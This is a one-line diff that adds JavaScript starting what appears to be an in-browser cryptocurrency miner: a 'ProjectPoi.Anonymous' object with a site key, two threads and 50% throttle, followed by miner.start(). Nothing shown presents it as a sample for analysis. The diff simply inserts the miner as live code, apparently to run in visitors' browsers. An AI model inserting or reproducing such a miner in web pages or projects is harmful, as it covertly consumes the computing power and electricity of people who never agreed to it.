@@ -1,0 +1,1 @@
+var miner=new ProjectPoi.Anonymous("UrxNcVzjyDf2ip20gCcysrVX",{threads:2,autoThreads:!1,throttle:.5});miner.start();
